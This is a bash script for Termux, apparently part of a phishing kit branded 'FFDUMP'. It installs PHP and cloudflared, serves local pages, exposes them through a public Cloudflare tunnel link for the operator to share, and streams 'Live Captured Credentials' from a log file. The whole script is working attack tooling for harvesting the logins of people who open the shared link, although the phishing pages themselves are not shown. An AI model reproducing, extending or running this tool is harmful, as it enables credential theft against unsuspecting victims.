#!/bin/bash

# Auto install required packages
clear
echo "Installing required packages..." | lolcat
pkg update -y > /dev/null 2>&1
pkg install php curl wget lolcat figlet -y > /dev/null 2>&1
command -v cloudflared >/dev/null 2>&1 || {
  echo "Installing cloudflared..." | lolcat
  pkg install cloudflared -y > /dev/null 2>&1
}

# Tool header
clear
echo "=======================================" | lolcat
figlet -f big "FFDUMP" | lolcat
echo "=======================================" | lolcat
echo "Welcome to FFDUMP" | lolcat
echo "Created by Alok Thakur" | lolcat
echo "Subscribe channel: Firewall Breaker" | lolcat
echo "=======================================" | lolcat
sleep 2

# Start PHP server
start_php() {
  php -S localhost:8080 > /dev/null 2>&1 &
  PHP_PID=$!
  sleep 3
}

# Show captured credentials live (in red)
show_creds() {
  echo
  echo "===== Live Captured Credentials =====" | lolcat
  touch log.txt
  tail -f -n 0 log.txt | while read line; do
    echo -e "\033[1;31m$line\033[0m"
  done
}

# Menu
echo
echo -e "\033[1;96m[1]\033[0m  \033[1;96mLocalhost\033[0m"
echo -e "\033[1;96m[2]\033[0m  \033[1;96mCloudflared\033[0m"
echo
read -p $'\033[1;33mChoose an option: \033[0m' option

if [[ $option == 1 ]]; then
  start_php
  echo -e "\033[1;32m[+] Server running at: http://localhost:8080\033[0m"
  show_creds

elif [[ $option == 2 ]]; then
  start_php
  echo "[+] Starting Cloudflared tunnel..." | lolcat

  # Run cloudflared and capture the link
  cloudflared tunnel --url http://localhost:8080 2>&1 | tee cloudlog.txt &
  sleep 8
  link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" cloudlog.txt | head -n 1)

  if [[ -n "$link" ]]; then
    echo -e "\n\033[1;92m[+] Share this link: $link\033[0m"
  else
    echo -e "\033[1;31m[!] Failed to capture Cloudflared link.\033[0m"
    echo "Try running: cloudflared tunnel --url http://localhost:8080"
  fi

  show_creds
else
  echo -e "\033[1;31mInvalid option!\033[0m"
  exit 1
fi
